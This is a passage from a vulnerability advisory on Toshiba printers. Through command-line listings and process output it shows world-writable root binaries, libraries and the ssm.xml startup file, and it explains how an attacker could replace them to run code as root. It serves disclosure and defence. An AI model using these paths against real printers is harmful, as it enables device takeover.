-rwxrwxrwx 1 root root 441641 Dec  6 02:24 /home/SYSROM_SRC/build/release/bin/alhddalertmgr
-rwxrwxrwx 1 root root 696894 Dec  6 02:24 /home/SYSROM_SRC/build/release/bin/alhddbackuprestore
-rwxrwxrwx 1 root root 829606 Dec  6 02:16 /home/SYSROM_SRC/build/release/bin/alhomedatamgr
-rwxrwxrwx 1 root root 606628 Dec  6 03:28 /home/SYSROM_SRC/build/release/bin/alifaxreceive
-rwxrwxrwx 1 root root 162074 Dec  6 02:22 /home/SYSROM_SRC/build/release/bin/alintegritychkmgr
-rwxrwxrwx 1 root root 4414769 Dec  6 02:08 /home/SYSROM_SRC/build/release/bin/aljobcontroller
-rwxrwxrwx 1 root root 2832921 Dec  6 02:15 /home/SYSROM_SRC/build/release/bin/aljobtemplatemgr
-rwxrwxrwx 1 root root 434559 Dec  6 02:22 /home/SYSROM_SRC/build/release/bin/allicensemgmt
-rwxrwxrwx 1 root root 1258130 Dec  6 02:15 /home/SYSROM_SRC/build/release/bin/almailboxapplication
-rwxrwxrwx 1 root root 4674491 Dec  6 03:32 /home/SYSROM_SRC/build/release/bin/almaintenanceplugin
-rwxrwxrwx 1 root root 2339610 Dec  6 02:25 /home/SYSROM_SRC/build/release/bin/alnfcplugin
-rwxrwxrwx 1 root root 743285 Dec  6 01:53 /home/SYSROM_SRC/build/release/bin/alnsm
-rwxrwxrwx 1 root root 740586 Dec  6 03:45 /home/SYSROM_SRC/build/release/bin/alpanel
-rwxrwxrwx 1 root root 292667 Dec  6 02:21 /home/SYSROM_SRC/build/release/bin/alpdlfiltermanager
-rwxrwxrwx 1 root root 387749 Dec  6 02:22 /home/SYSROM_SRC/build/release/bin/alpresentationresourcemgr
-rwxrwxrwx 1 root root 1314049 Dec  6 01:52 /home/SYSROM_SRC/build/release/bin/alprintmn
-rwxrwxrwx 1 root root 2360596 Dec  6 03:22 /home/SYSROM_SRC/build/release/bin/alreportmanager
-rwxrwxrwx 1 root root 595735 Dec  6 03:21 /home/SYSROM_SRC/build/release/bin/alreportsmsgr
-rwxrwxrwx 1 root root 1367678 Dec  6 02:19 /home/SYSROM_SRC/build/release/bin/alrestrictionmode
-rwxrwxrwx 1 root root 1253012 Dec  6 02:21 /home/SYSROM_SRC/build/release/bin/alrolemgr
-rwxrwxrwx 1 root root 2272202 Dec  6 02:18 /home/SYSROM_SRC/build/release/bin/alsecurityconfiguration
-rwxrwxrwx 1 root root 972621 Dec  6 03:52 /home/SYSROM_SRC/build/release/bin/alsharedprintDp
-rwxrwxrwx 1 root root 1060254 Dec  6 02:13 /home/SYSROM_SRC/build/release/bin/alsoftwareupdateclient
-rwxrwxrwx 1 root root 1711439 Dec  6 02:25 /home/SYSROM_SRC/build/release/bin/alulm
-rwxrwxrwx 1 root root 612467 Dec  6 02:18 /home/SYSROM_SRC/build/release/bin/alusbmscapplication
-rwxrwxrwx 1 root root 3759736 Dec  6 02:17 /home/SYSROM_SRC/build/release/bin/aluserAuthMgr
-rwxrwxrwx 1 root root 2874311 Dec  6 02:20 /home/SYSROM_SRC/build/release/bin/alusermgr
-rwxrwxrwx 1 root root 899734 Dec  6 01:53 /home/SYSROM_SRC/build/release/bin/alwsdiscovery
-rwxrwxrwx 1 root root 809391 Dec  6 01:53 /home/SYSROM_SRC/build/release/bin/alwsmex
-rwxrwxrwx 1 root root 3782642 Dec  6 01:55 /home/SYSROM_SRC/build/release/bin/alwsprint
-rwxrwxrwx 1 root root 4271522 Dec  6 01:56 /home/SYSROM_SRC/build/release/bin/alwsscanner
-rwxrwxrwx 1 root root 355919 Dec  6 03:53 /home/SYSROM_SRC/build/release/bin/armn
-rwxrwxrwx 1 root root 18113 Dec  6 01:42 /home/SYSROM_SRC/build/release/bin/cipollproc
-rwxrwxrwx 1 root root 71587 Dec  6 01:42 /home/SYSROM_SRC/build/release/bin/ciprioritymanager
-rwxrwxrwx 1 root root 445362 Dec  6 01:42 /home/SYSROM_SRC/build/release/bin/cischeduler
-rwxrwxrwx 1 root root 532898 Dec  6 01:42 /home/SYSROM_SRC/build/release/bin/cissm
-rwxrwxrwx 1 root root 508004 Dec  6 01:48 /home/SYSROM_SRC/build/release/bin/cisystemresourcemanager
-rwxrwxrwx 1 root root 501163 Dec  6 04:16 /home/SYSROM_SRC/build/release/bin/cpe
-rwxrwxrwx 1 root root 1016124 Dec  6 04:39 /home/SYSROM_SRC/build/release/bin/de_ipfax
-rwxrwxrwx 1 root root 303779 Dec  6 04:16 /home/SYSROM_SRC/build/release/bin/dem
-rwxrwxrwx 1 root root 622110 Dec  6 04:16 /home/SYSROM_SRC/build/release/bin/dim
-rwxrwxrwx 1 root root 12229927 Dec  6 04:44 /home/SYSROM_SRC/build/release/bin/ebx_dl
-rwxrwxrwx 1 root root 1649127 Dec  6 04:02 /home/SYSROM_SRC/build/release/bin/informationservice
-rwxrwxrwx 1 root root 1257189 Dec  6 04:01 /home/SYSROM_SRC/build/release/bin/notificationservice
-rwxrwxrwx 1 root root 426167 Dec  6 04:14 /home/SYSROM_SRC/build/release/bin/pipeMN
-rwxrwxrwx 1 root root 269419 Dec  6 04:02 /home/SYSROM_SRC/build/release/bin/sim
-rwxrwxrwx 1 root root 258577 Dec  6 04:02 /home/SYSROM_SRC/build/release/bin/sljobmanagement
-rwxrwxrwx 1 root root 32089 Mar 14 16:28 /home/SYSROM_SRC/build/release/bin/ssdktimestamp
-rwxrwxrwx 1 root root 5986687 Dec  6 04:07 /home/SYSROM_SRC/build/release/bin/wfpc
-rwxrwxrwx 1 root root 78627 Dec  6 02:00 /home/SYSROM_SRC/bin/alllmnr
-rwxrwxrwx 1 root root 68223 Dec  6 01:57 /home/SYSROM_SRC/bin/dnsValidateDaemon
-rwxrwxrwx 1 root root 104184 Dec  6 01:48 /home/SYSROM_SRC/bin/eBXDebugLogUtility
-rwxrwxrwx 1 root root 76674 Dec  6 02:01 /home/SYSROM_SRC/bin/ipv6_daemon
-rwxrwxrwx 1 root root 28318 Dec  6 01:40 /home/SYSROM_SRC/bin/mapper
-rwxrwxrwx 1 root root 167219 Dec  6 01:48 /home/SYSROM_SRC/bin/syscallerr
-rwxrwxrwx 1 root root 316382 Dec  6 02:03 /home/SYSROM_SRC/build/release/bin/aleSCL
-rwxrwxrwx 1 root root 21142 Dec  6 02:01 /home/SYSROM_SRC/build/release/bin/alftpprintd
-rwxrwxrwx 1 root root 243145 Dec  6 01:53 /home/SYSROM_SRC/build/release/bin/alhp9100
-rwxrwxrwx 1 root root 84257 Dec  6 01:56 /home/SYSROM_SRC/build/release/bin/allld2d
-rwxrwxrwx 1 root root 270934 Dec  6 01:53 /home/SYSROM_SRC/build/release/bin/allprng
-rwxrwxrwx 1 root root 389522 Dec  6 02:02 /home/SYSROM_SRC/build/release/bin/alnetefiRemoteifsr
-rwxrwxrwx 1 root root 15176259 Dec  6 03:39 /home/SYSROM_SRC/build/release/bin/alstage2
-rwxrwxrwx 1 root root 126466 Dec  6 02:01 /home/SYSROM_SRC/build/release/bin/alusbPrint
-rwxrwxrwx 1 root root 1419229 Dec  6 02:01 /home/SYSROM_SRC/build/release/bin/faxmilter
-rwxrwxrwx 1 root root 21638 Dec  6 03:28 /home/SYSROM_SRC/build/release/bin/snmp_watchdog
-rwxrwxrwx 1 apache messagebus 656546 Dec  6 01:34 /usr/local/ebx/bin/httpd
-rwxrwxrwx 1 apache messagebus 665612 Dec  6 01:34 /usr/local/ebx/httpd_worker/bin/httpd_worker</font>
</pre>

<p>The previous command lists symbolic links that we can analyze, and we can confirm they are also vulnerable due to insecure permissions:</p>
<pre>
lrwxrwxrwx 1 root root 35 Mar 14 16:27 /home/SYSROM_SRC/bin/dibbler-client -> ../../thirdparty/bin/dibbler-client
lrwxrwxrwx 1 root root 26 Mar 14 16:27 /home/SYSROM_SRC/build/release/bin/alipp -> ../../thirdparty/bin/alipp
lrwxrwxrwx 1 root root 39 Mar 14 16:27 /home/SYSROM_SRC/build/release/bin/mDNSResponderPosix -> ../../thirdparty/bin/mDNSResponderPosix
lrwxrwxrwx 1 root root 25 Mar 14 16:27 /home/SYSROM_SRC/build/release/bin/nqcs -> ../../thirdparty/bin/nqcs
lrwxrwxrwx 1 root root 25 Mar 14 16:27 /home/SYSROM_SRC/build/release/bin/nqnd -> ../../thirdparty/bin/nqnd
lrwxrwxrwx 1 root root 30 Mar 14 16:27 /home/SYSROM_SRC/build/release/bin/slapd -> ../../thirdparty/libexec/slapd
lrwxrwxrwx 1 root root 27 Mar 14 16:27 /home/SYSROM_SRC/build/release/bin/snmpd -> ../../thirdparty/sbin/snmpd
lrwxrwxrwx 1 root root 27 Mar 14 16:27 /home/SYSROM_SRC/build/release/bin/vsftpd -> ../../thirdparty/bin/vsftpd
lrwxrwxrwx 1 root root 27 Mar 14 16:27 /home/SYSROM_SRC/build/release/bin/python -> ../../thirdparty/bin/python

bash-4.1# for i in dibbler-client alipp mDNSResponderPosix nqcs nqnd vsftpd python; do ls -la /home/SYSROM_SRC/build/thirdparty/bin/$i;done
<font color=red>-rwxrwxrwx 1 root root 11339780 Dec  6 01:38 /home/SYSROM_SRC/build/thirdparty/bin/dibbler-client
-rwxrwxrwx 1 apache messagebus 653763 Dec  6 01:40 /home/SYSROM_SRC/build/thirdparty/bin/alipp
-rwxrwxrwx 1 root root 429709 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/bin/mDNSResponderPosix
-rwxrwxrwx 1 apache messagebus 1342015 Dec  6 01:35 /home/SYSROM_SRC/build/thirdparty/bin/nqcs
-rwxrwxrwx 1 apache messagebus 501752 Dec  6 01:35 /home/SYSROM_SRC/build/thirdparty/bin/nqnd
-rwxrwxrwx 1 root root 232030 Dec  6 01:34 /home/SYSROM_SRC/build/thirdparty/bin/vsftpd</font>
lrwxrwxrwx 1 root root 7 Mar 14 16:27 /home/SYSROM_SRC/build/thirdparty/bin/python -> python3
bash-4.1# ls -la /home/SYSROM_SRC/build/thirdparty/libexec/slapd
<font color=red>-rwxrwxrwx 1 root root 1709140 Dec  6 01:34 /home/SYSROM_SRC/build/thirdparty/libexec/slapd</font>
bash-4.1# ls -la /home/SYSROM_SRC/build/thirdparty/sbin/snmpd
<font color=red>-rwxrwxrwx 1 apache messagebus 41801 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/sbin/snmpd</font>
bash-4.1# ls -la /home/SYSROM_SRC/build/release/bin/python3
lrwxrwxrwx 1 root root 28 Mar 14 16:27 /home/SYSROM_SRC/build/release/bin/python3 -> ../../thirdparty/bin/python3
bash-4.1# ls -la /home/SYSROM_SRC/build/thirdparty/bin/python3
lrwxrwxrwx 1 root root 9 Mar 14 16:27 /home/SYSROM_SRC/build/thirdparty/bin/python3 -> python3.5
bash-4.1# ls -la /home/SYSROM_SRC/build/thirdparty/bin/python3.5
<font color=red>-rwxrwxrwx 1 root root 20997 Dec  6 01:28 /home/SYSROM_SRC/build/thirdparty/bin/python3.5</font>
bash-4.1#
</pre>

<p>An attacker can remotely compromise any Toshiba printer.</p>
<p>The programs can be replaced by malicious programs by any local or remote attacker.</p>
<p><a id="lpe-rce-libs"></a></p>
<h2>Details - Local Privilege Escalation and Remote Code Execution using insecure permissions for libraries</h2>
<p>Some vendor-specific programs are running inside Toshiba printers. These programs run as root and use code from libraries that have insecure permissions (777) allowing an attacker to replace these libraries with malicious ones. This Local Privilege Escalation can be also exploited as a Remote Code Execution by uploading a malicious library using the <a href="#pre-auth-rces-upload">Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a> vulnerability.</p>
<p>For example, the <code>/home/SYSROM_SRC/bin/syscallerr</code> program runs regularly as root:</p>
<p><a id="lpe-rce-syscallerr"></a></p>
<h3>Example with <code>/home/SYSROM_SRC/bin/syscallerr</code>:</h3>
<p>Output of <code>pspy32</code>, where we can see <code>/home/SYSROM_SRC/bin/syscallerr</code> running regularly as root:</p>
<pre>
2023/05/27  16:13:35 CMD: UID=0     PID=31370  | sh -c du -cb /work/log/corefiles/core.* 2> /dev/null | grep total | awk '{print $1}'
2023/05/27  16:13:35 CMD: UID=0     PID=31373  | sh -c du -cb /work/log/corefiles/core.* 2> /dev/null | grep total | awk '{print $1}'
2023/05/27  16:13:35 CMD: UID=0     PID=31372  | grep total
2023/05/27  16:13:35 CMD: UID=0     PID=31371  | sh -c du -cb /work/log/corefiles/core.* 2> /dev/null | grep total | awk '{print $1}'
2023/05/27  16:13:35 CMD: UID=0     PID=31374  | /home/SYSROM_SRC/bin/syscallerr
2023/05/27  16:13:35 CMD: UID=0     PID=31376  | awk {print}
2023/05/27  16:13:35 CMD: UID=0     PID=31375  |
2023/05/27  16:13:35 CMD: UID=0     PID=31377  | sh -c ps -e | grep ebx_dl
2023/05/27  16:13:35 CMD: UID=0     PID=31379  | grep ebx_dl
2023/05/27  16:13:35 CMD: UID=0     PID=31378  | ps -e
<font color=red>2023/05/27  16:13:35 CMD: UID=0     PID=31380  | /home/SYSROM_SRC/bin/syscallerr</font>
2023/05/27  16:13:35 CMD: UID=0     PID=31383  | sh -c ps -e | grep ebx_dl | awk '{print $5}'
2023/05/27  16:13:35 CMD: UID=0     PID=31382  |
2023/05/27  16:13:35 CMD: UID=0     PID=31381  | ps -e
2023/05/27  16:13:35 CMD: UID=0     PID=31384  | sh -c ps -e | grep cissm
2023/05/27  16:13:35 CMD: UID=0     PID=31386  | grep cissm
2023/05/27  16:13:35 CMD: UID=0     PID=31385  | ps -e
2023/05/27  16:13:35 CMD: UID=0     PID=31387  | sh -c dd if=/dev/mtdblock1 of=/ramdisk/FROM_SERIAL > /dev/null 2>&1
2023/05/27  16:13:35 CMD: UID=0     PID=31388  | dd if=/dev/mtdblock1 of=/ramdisk/FROM_SERIAL
2023/05/27  16:13:35 CMD: UID=0     PID=31389  | sh -c ps -e | grep ebx_dl
2023/05/27  16:13:35 CMD: UID=0     PID=31391  | grep ebx_dl
</pre>

<p>When analyzing this program, we can find several shared libraries that will be loaded - their code will be executed as root.</p>
<p>We can find the previously vulnerable shared libraries defined with LD_PRELOAD:</p>
<ul>
<li><code>/ramdisk/al/libGetNameInfoInterface.so</code></li>
<li><code>/ramdisk/al/libGetAddtInfoInterface.so</code></li>
</ul>
<p>We can also find several libraries that are being loaded:</p>
<pre><code>bash-4.1# ldd /home/SYSROM_SRC/bin/syscallerr
        linux-gate.so.1 =&gt;  (0x777c0000)
        /ramdisk/al/libGetNameInfoInterface.so (0x777b1000)
        /ramdisk/al/libGetAddtInfoInterface.so (0x777a0000)
        libpthread.so.0 =&gt; /lib/libpthread.so.0 (0x77780000)
        libsqlite3.so.0 =&gt; /usr/lib/libsqlite3.so.0 (0x4be4c000)
        libciindexeddb.so =&gt; /home/SYSROM_SRC/build/release/lib/libciindexeddb.so (0x77729000)
        libsyscallerr.so =&gt; /home/SYSROM_SRC/build/release/lib/libsyscallerr.so (0x77720000)
        libcios.so =&gt; /home/SYSROM_SRC/build/release/lib/libcios.so (0x776ad000)
        libatawrapper.so.0 =&gt; /mfp/lib/libatawrapper.so.0 (0x7768b000)
        libmfpcommonwrapper.so.0 =&gt; /mfp/lib/libmfpcommonwrapper.so.0 (0x77682000)
        libcrypto.so.1.0.0 =&gt; /home/SYSROM_SRC/build/release/lib/libcrypto.so.1.0.0 (0x77420000)
        libstdc++.so.6 =&gt; /usr/lib/libstdc++.so.6 (0x4c04f000)
        libgcc_s.so.1 =&gt; /lib/libgcc_s.so.1 (0x4c14b000)
        libintlc.so.5 =&gt; /usr/lib/libintlc.so.5 (0x773c3000)
        libsvml.so =&gt; /mfp/lib/libsvml.so (0x76ba9000)
        libc.so.6 =&gt; /lib/libc.so.6 (0x4bc67000)
        libdl.so.2 =&gt; /lib/libdl.so.2 (0x4bdaf000)
        libllmnrclient.so =&gt; /home/SYSROM_SRC/build/release/lib/libllmnrclient.so (0x76b95000)
        /lib/ld-linux.so.2 (0x4bc47000)
        libsqlite.so.0 =&gt; /home/SYSROM_SRC/build/release/lib/libsqlite.so.0 (0x76b35000)
        libcpanel.so.0 =&gt; /mfp/lib/libcpanel.so.0 (0x76b0e000)
        libcimsg.so =&gt; /home/SYSROM_SRC/build/release/lib/libcimsg.so (0x76b02000)
        libcissmclient.so =&gt; /home/SYSROM_SRC/build/release/lib/libcissmclient.so (0x76ae8000)
        libacl.so.1 =&gt; /lib/libacl.so.1 (0x4bdd7000)
        librt.so.1 =&gt; /lib/librt.so.1 (0x4be15000)
        libm.so.6 =&gt; /lib/libm.so.6 (0x76abf000)
        libssdk.so.0 =&gt; /home/SYSROM_SRC/build/release/lib/libssdk.so.0 (0x75f1e000)
        libcihdb.so =&gt; /home/SYSROM_SRC/build/release/lib/libcihdb.so (0x75e56000)
        libattr.so.1 =&gt; /lib/libattr.so.1 (0x4bdd0000)
        libpam.so.0 =&gt; /lib/libpam.so.0 (0x75e4a000)
        libldap-2.4.so.2 =&gt; /home/SYSROM_SRC/build/release/lib/libldap-2.4.so.2 (0x75e12000)
        libssl.so.1.0.0 =&gt; /home/SYSROM_SRC/build/release/lib/libssl.so.1.0.0 (0x75da6000)
        libk5crypto.so.3 =&gt; /usr/lib/libk5crypto.so.3 (0x75d84000)
        libresolv.so.2 =&gt; /lib/libresolv.so.2 (0x4c164000)
        libext2fs.so.2 =&gt; /usr/lib/libext2fs.so.2 (0x75d5a000)
        libuuid.so.1 =&gt; /usr/lib/libuuid.so.1 (0x4be0f000)
        libkrb5support.so.0 =&gt; /usr/lib/libkrb5support.so.0 (0x75d53000)
        libkrb5.so.25 =&gt; /home/SYSROM_SRC/build/release/lib/libkrb5.so.25 (0x75ce2000)
        libgssapi.so.2 =&gt; /home/SYSROM_SRC/build/release/lib/libgssapi.so.2 (0x75cae000)
        libCryptolib.so.0 =&gt; /home/SYSROM_SRC/build/release/lib/libCryptolib.so.0 (0x75c2b000)
        libirng.so =&gt; /usr/lib/libirng.so (0x75c22000)
        libcilkrts.so.5 =&gt; /usr/lib/libcilkrts.so.5 (0x75bee000)
        libexpat.so.1 =&gt; /usr/lib/libexpat.so.1 (0x4c403000)
        libcrypt.so.1 =&gt; /lib/libcrypt.so.1 (0x75bbc000)
        liblber-2.4.so.2 =&gt; /home/SYSROM_SRC/build/release/lib/liblber-2.4.so.2 (0x75bb0000)
        libsasl2.so.2 =&gt; /home/SYSROM_SRC/build/release/lib/libsasl2.so.2 (0x75b8c000)
        libcom_err.so.2 =&gt; /usr/lib/libcom_err.so.2 (0x4bdee000)
        libhx509.so.5 =&gt; /home/SYSROM_SRC/build/release/lib/libhx509.so.5 (0x75b4b000)
        libheimsqlite.so.0 =&gt; /home/SYSROM_SRC/build/release/lib/libheimsqlite.so.0 (0x75ad7000)
        libhcrypto.so.4 =&gt; /home/SYSROM_SRC/build/release/lib/libhcrypto.so.4 (0x75aa4000)
        libasn1.so.8 =&gt; /home/SYSROM_SRC/build/release/lib/libasn1.so.8 (0x75a02000)
        libwind.so.0 =&gt; /home/SYSROM_SRC/build/release/lib/libwind.so.0 (0x759da000)
        libcom_err.so.1 =&gt; /home/SYSROM_SRC/build/release/lib/libcom_err.so.1 (0x759d6000)
        libroken.so.18 =&gt; /home/SYSROM_SRC/build/release/lib/libroken.so.18 (0x759c2000)
        libheimntlm.so.0 =&gt; /home/SYSROM_SRC/build/release/lib/libheimntlm.so.0 (0x759bc000)
bash-4.1#
</code></pre>
<p>We can find these 31 insecure libraries:</p>
<ul>
<li>/home/SYSROM_SRC/build/release/lib/libciindexeddb.so.0</li>
<li>/home/SYSROM_SRC/build/release/lib/libsyscallerr.so.0</li>
<li>/home/SYSROM_SRC/build/release/lib/libcios.so.0</li>
<li>/mfp/lib/libatawrapper.so.0.0</li>
<li>/mfp/lib/libmfpcommonwrapper.so.0.0</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libcrypto.so.1.0.0</li>
<li>/mfp/lib/libsvml.so</li>
<li>/home/SYSROM_SRC/build/release/lib/libllmnrclient.so.0</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libsqlite.so.0.8.6</li>
<li>/mfp/lib/libcpanel.so.0.0</li>
<li>/home/SYSROM_SRC/build/release/lib/libcimsg.so.0</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libsqlite.so.0.8.6</li>
<li>/home/SYSROM_SRC/build/release/lib/libcimsg.so.0</li>
<li>/home/SYSROM_SRC/build/release/lib/libcissmclient.so.0</li>
<li>/home/SYSROM_SRC/build/release/lib/libssdk.so.0.0.0</li>
<li>/home/SYSROM_SRC/build/release/lib/libcihdb.so.0</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libldap-2.4.so.2.5.6</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libssl.so.1.0.0</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libgssapi.so.2.0.0</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libkrb5.so.25.0.0</li>
<li>/home/SYSROM_SRC/NoBuildItems/common/lib/libCryptolib.so.0</li>
<li>/home/SYSROM_SRC/NoBuildItems/common/lib/libCryptolib.so.0.0.0</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/liblber-2.4.so.2.5.6</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libhx509.so.5.0.0</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libheimsqlite.so.0.0.0</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libhcrypto.so.4.1.0</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libasn1.so.8.0.0</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libwind.so.0.0.0</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libcom_err.so.1.1.3</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libroken.so.18.1.0</li>
<li>/home/SYSROM_SRC/build/thirdparty/lib/libheimntlm.so.0.1.0</li>
</ul>
<p>The permissions of these libraries are insecure. A remote attacker can overwrite them and achieve Remote Code Execution:</p>
<pre><font color=red>-rwxrwxrwx 1 root root 322261 Dec  6 01:41 /home/SYSROM_SRC/build/release/lib/libciindexeddb.so.0
-rwxrwxrwx 1 root root 343680 Dec  6 01:48 /home/SYSROM_SRC/build/release/lib/libsyscallerr.so.0
-rwxrwxrwx 1 root root 566991 Dec  6 01:41 /home/SYSROM_SRC/build/release/lib/libcios.so.0
-rwxrwxrwx 1 root root 139986 Sep 19  2019 /mfp/lib/libatawrapper.so.0.0
-rwxrwxrwx 1 root root 38330 May 28  2019 /mfp/lib/libmfpcommonwrapper.so.0.0
-rwxrwxrwx 1 apache messagebus 2765203 Dec  6 01:28 /home/SYSROM_SRC/build/thirdparty/lib/libcrypto.so.1.0.0
-rwxrwxrwx 1 root root 9479623 Apr 25  2014 /mfp/lib/libsvml.so
-rwxrwxrwx 1 root root 95211 Dec  6 02:00 /home/SYSROM_SRC/build/release/lib/libllmnrclient.so.0
-rwxrwxrwx 1 root root 744984 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/lib/libsqlite.so.0.8.6
-rwxrwxrwx 1 root root 48131 Apr  8  2019 /mfp/lib/libcpanel.so.0.0
-rwxrwxrwx 1 root root 58976 Dec  6 01:41 /home/SYSROM_SRC/build/release/lib/libcimsg.so.0
-rwxrwxrwx 1 root root 744984 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/lib/libsqlite.so.0.8.6
-rwxrwxrwx 1 root root 58976 Dec  6 01:41 /home/SYSROM_SRC/build/release/lib/libcimsg.so.0
-rwxrwxrwx 1 root root 127850 Dec  6 01:41 /home/SYSROM_SRC/build/release/lib/libcissmclient.so.0
-rwxrwxrwx 1 root root 14101772 Dec  6 01:40 /home/SYSROM_SRC/build/release/lib/libssdk.so.0.0.0
-rwxrwxrwx 1 root root 909064 Dec  6 01:41 /home/SYSROM_SRC/build/release/lib/libcihdb.so.0
-rwxrwxrwx 1 root root 269392 Dec  6 01:34 /home/SYSROM_SRC/build/thirdparty/lib/libldap-2.4.so.2.5.6
-rwxrwxrwx 1 apache messagebus 485480 Dec  6 01:28 /home/SYSROM_SRC/build/thirdparty/lib/libssl.so.1.0.0
-rwxrwxrwx 1 root   root       251701 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/lib/libgssapi.so.2.0.0
-rwxrwxrwx 1 root root 539700 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/lib/libkrb5.so.25.0.0
-rwxrwxrwx 1 root root 624082 Dec  6 04:53 /home/SYSROM_SRC/NoBuildItems/common/lib/libCryptolib.so.0
-rwxrwxrwx 1 root root 624082 Apr 20  2018 /home/SYSROM_SRC/NoBuildItems/common/lib/libCryptolib.so.0.0.0
-rwxrwxrwx 1 root root 60708 Dec  6 01:34 /home/SYSROM_SRC/build/thirdparty/lib/liblber-2.4.so.2.5.6
-rwxrwxrwx 1 root root 324233 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/lib/libhx509.so.5.0.0
-rwxrwxrwx 1 root root 525228 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/lib/libheimsqlite.so.0.0.0
-rwxrwxrwx 1 root root 225346 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/lib/libhcrypto.so.4.1.0
-rwxrwxrwx 1 root root 759349 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/lib/libasn1.so.8.0.0
-rwxrwxrwx 1 root root 166289 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/lib/libwind.so.0.0.0
-rwxrwxrwx 1 root root 14571 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/lib/libcom_err.so.1.1.3
-rwxrwxrwx 1 root root 92942 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/lib/libroken.so.18.1.0
-rwxrwxrwx 1 root root 24134 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/lib/libheimntlm.so.0.1.0
</font></pre>

<p>An attacker can remotely compromise any Toshiba printer.</p>
<p>The libraries (more than hundreds) used by these programs can be replaced by malicious libraries by any local or remote attacker.</p>
<p><a id="lpe-rce-cissm"></a></p>
<h2>Details - Local Privilege Escalation and Remote Code Execution using CISSM</h2>
<p>It was observed that the <code>cissm</code> program runs as root inside the printers. This Toshiba-specific program will start children processes as shown below, based on the content of the <code>/home/SYSROM_SRC/build/common/bin/ssm.xml</code> XML file stored in the printer:</p>
<pre><code>bash-4.1# ps auxw | grep cissm
root      1487  0.0  0.3  53496 10184 ?        Sl   16:34   0:02 ./cissm -T 7 -d ssm.xml
bash-4.1# pstree
[...]
     |-cissm-+-alAddressBookMg
     |       |-alCloning
     |       |-alExportImport
     |       |-alLogRetriever
     |       |-alLogmanager---{alLogmanager}
     |       |-alPanelStartLED---{alPanelStartLE}
     |       |-alPanelUIMessag---{alPanelUIMessa}
     |       |-alServiceUIPlug
     |       |-alUiFrameWork---24*[{alUiFrameWork}]
     |       |-alViewPlugin---3*[{alViewPlugin}]
     |       |-alaccountmgr---2*[{alaccountmgr}]
     |       |-alappmanager-+-2*[python---5*[{python}]]
     |       |              `-15*[{alappmanager}]
     |       |-alboserver---7*[{alboserver}]
     |       |-alcbamanager---26*[{alcbamanager}]
     |       |-aldevauthmgmtpl
     |       |-aldeviceconfigp
     |       |-aldeviceservice---{aldeviceservic}
     |       |-aleFilingmgr
     |       |-alfilestoragem
     |       |-algrpmgr
     |       |-alhddalertmgr
     |       |-alhddbackuprest
     |       |-alhomedatamgr
     |       |-alifaxreceive
     |       |-alintegritychkm
     |       |-aljobcontroller---8*[{aljobcontrolle}]
[...]
</code></pre>
<p>The XML configuration file used by cissm is located at <code>/home/SYSROM_SRC/build/thirdparty/bin/ssm.xml</code> and has insecure permissions:</p>
<pre><code>bash-4.1# ls -la /home/SYSROM_SRC/build/release/bin/ssm.xml /home/SYSROM_SRC/build/thirdparty/bin/ssm.xml /home/SYSROM_SRC/build/common/bin/ssm.xml
-rwxrwxrwx 1 root root 55245 Oct  7  2021 /home/SYSROM_SRC/build/common/bin/ssm.xml
lrwxrwxrwx 1 root root    28 Mar 14 16:27 /home/SYSROM_SRC/build/release/bin/ssm.xml -&gt; ../../thirdparty/bin/ssm.xml
lrwxrwxrwx 1 root root    24 Mar 14 16:27 /home/SYSROM_SRC/build/thirdparty/bin/ssm.xml -&gt; ../../common/bin/ssm.xmlroot
</code></pre>
<p>This file is used to run program as root when the printer starts and can be used to redefine any program running as root when the printer boots. This program also runs every 3 minute.</p>
<p>An attacker can remotely write an additional entry to start a malicious command that will be executed as root when the printer boots:</p>
<p>Content of <code>/home/SYSROM_SRC/build/common/bin/ssm.xml</code>:</p>
<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;SSM xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="../../../LayerInterface/CI/ServiceStartupManager/SSM.xsd"&gt;
    &lt;!-- Start: CI Layer services --&gt;
    &lt;Service&gt;
        &lt;name&gt;cischeduler&lt;/name&gt;
        &lt;group/&gt;
        &lt;exePath&gt;./cischeduler&lt;/exePath&gt;
        &lt;startupType&gt;Automatic&lt;/startupType&gt;
        &lt;enabled&gt;1&lt;/enabled&gt;
        &lt;ProcessGroup&gt;TRUSTED&lt;/ProcessGroup&gt;
        &lt;StartParameters&gt;
            &lt;Param&gt;-S&lt;/Param&gt;
            &lt;Param&gt;ramdisk&lt;/Param&gt;
            &lt;Param&gt;&amp;gt;&lt;/Param&gt;
            &lt;Param&gt;/work/log/ci/cischeduler.log&lt;/Param&gt;
        &lt;/StartParameters&gt;      
    &lt;/Service&gt;
    &lt;Service&gt;
        &lt;name&gt;cipollproc&lt;/name&gt;
        &lt;group/&gt;
        &lt;exePath&gt;./cipollproc&lt;/exePath&gt;
